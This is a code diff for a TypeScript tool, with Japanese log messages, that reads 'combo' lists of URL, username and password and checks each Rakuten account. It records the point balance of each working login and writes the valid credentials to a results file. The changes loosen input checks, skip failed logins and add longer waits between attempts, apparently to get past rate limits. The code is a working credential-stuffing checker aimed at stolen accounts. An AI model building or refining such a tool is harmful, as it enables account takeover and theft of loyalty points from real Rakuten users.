@@ -2,7 +2,7 @@ import { inputManager } from "../inputManager";
 import {
   EnoguLike,
   LoggerLike,
-  PointAndNameResult,
+  PointResult,
   RouterResult,
   config,
 } from "../types";
@@ -22,7 +22,7 @@ export class ComboRakutenRouter {
   ) {}
 
   async start() {
-    this.logger.info({}, "単体楽天垢 ポイントチェック");
+    this.logger.info({}, "Combo楽天垢 ポイントチェック");
     this.logger.info({}, "Crtl + C で終了");
     this.loggerMessages.blank();
 
@@ -33,15 +33,11 @@ export class ComboRakutenRouter {
     ).trim();
 
     const resultFilePath = (
-      await new inputManager("結果の出力パスを入力してください").waitInput()
+      await new inputManager("結果の出力パスを入力してください: ").waitInput()
     ).trim();
+    this.loggerMessages.blank();
 
-    if (
-      /^(?:[a-zA-Z]:\\|(?:\\{2}[\w\d]+\\[\w.-]+))[^\\]*$/.test(
-        resultFilePath,
-      ) ||
-      /^(?:\/[^\/]+)+$/.test(resultFilePath)
-    ) {
+    if (/^\S+$/.test(resultFilePath)) {
       if (!fs.existsSync(resultFilePath)) {
         fs.writeFileSync(resultFilePath, "");
         this.logger.info(
@@ -54,13 +50,7 @@ export class ComboRakutenRouter {
       return;
     }
 
-    if (
-      (/^(?:[a-zA-Z]:\\|(?:\\{2}[\w\d]+\\[\w.-]+))[^\\]*$/.test(
-        comboFilePath,
-      ) ||
-        /^(?:\/[^\/]+)+$/.test(comboFilePath)) &&
-      fs.existsSync(comboFilePath)
-    ) {
+    if (/^\S+$/.test(comboFilePath) && fs.existsSync(comboFilePath)) {
       const content = fs.readFileSync(comboFilePath, "utf8").split("\n");
       const comboResult: {
         username: string;
@@ -75,22 +65,22 @@ export class ComboRakutenRouter {
       }
 
       for (let i = 0, len = content.length; i < len; i++) {
-        const splitLine = content[i].split(":");
+        const splitLine = content[i].replace("://", "_split_web_").split(":");
         const url = splitLine[0];
-        if (!url.includes("rakuten")) {
+        if (!url.includes("rakuten") || splitLine.length < 3) {
           this.logger.warn({}, "形式が違うComboがスキップされました。");
+          continue;
         }
 
         splitLine.shift();
-        const username = splitLine[0];
+        const username = splitLine[0].trim();
         splitLine.shift();
-        const password = splitLine.join(":");
+        const password = splitLine.join(":").trim();
         comboResult.push({
           username,
           password,
         });
       }
-
       for (let i = 0, len = comboResult.length; i < len; i++) {
         this.logger.info(
           {},
@@ -104,23 +94,32 @@ export class ComboRakutenRouter {
         )
           .check(comboResult[i].username, comboResult[i].password)
           .then((result) => {
+            if (!JSON.parse(result.message).success) {
+              return;
+            }
+
             this.logger.info(
               {},
               `(${i + 1}/${len}) ${comboResult[i].username}:${comboResult[i].password} の解析完了`,
             );
             this.logger.info(
               {},
-              `(${i + 1}/${len}) ${comboResult[i].username}:${comboResult[i].password} ポイント: ${JSON.parse(result.message).point} ユーザー名: ${JSON.parse(result.message).name}`,
+              `(${i + 1}/${len}) ${comboResult[i].username}:${comboResult[i].password} ポイント: ${JSON.parse(result.message).point}`,
             );
 
             fs.appendFileSync(
               resultFilePath,
-              `${comboResult[i].username}:${comboResult[i].password}:${JSON.parse(result.message).point}:${JSON.parse(result.message).name}\n`,
+              `${comboResult[i].username ?? "unknown"}:${comboResult[i].password ?? "unknown"}:${JSON.parse(result.message).point}`.replace(
+                /\n/gm,
+                "",
+              ) + "\n",
             );
           });
 
-        await wait(this.config.values.interval);
+        await wait(this.config.values.interval + 2500);
       }
+
+      await wait(content.length * 30000);
     } else {
       this.logger.error({}, "正しいファイルパスを入力してください");
       return;
